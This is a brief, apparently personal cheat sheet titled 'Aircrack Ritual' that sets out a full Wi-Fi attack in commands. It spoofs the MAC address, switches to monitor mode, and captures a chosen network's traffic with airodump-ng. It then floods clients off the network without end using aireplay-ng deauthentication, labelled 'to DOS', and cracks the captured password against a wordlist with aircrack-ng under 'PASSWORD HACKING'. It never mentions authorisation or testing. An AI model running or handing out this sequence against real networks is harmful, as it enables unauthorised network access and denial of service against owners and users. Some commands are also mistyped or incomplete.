Aircrack Ritual

ifconfig wlan0 down
macchanger -r wlan0
iwconfig mode monitor
ifconfig wlan0 up

change and kill with airmon
airmon-ng check wlan0 

airodump-ng wlan0 -- find target

then 

airodump-ng -c[Channel] -w[FILE] --bssid [ssid] wlan0

iwconfig wlan0 channel [channel of target]

to DOS

aireplay-ng -0 0 -a [MAC] wlan0

if channel is specified go iwconfig wlan0 channel [channel]

PASSWORD HACKING

aircrack-ng -w [path to dictionary -b [bssid of target]  [path to the capture file]


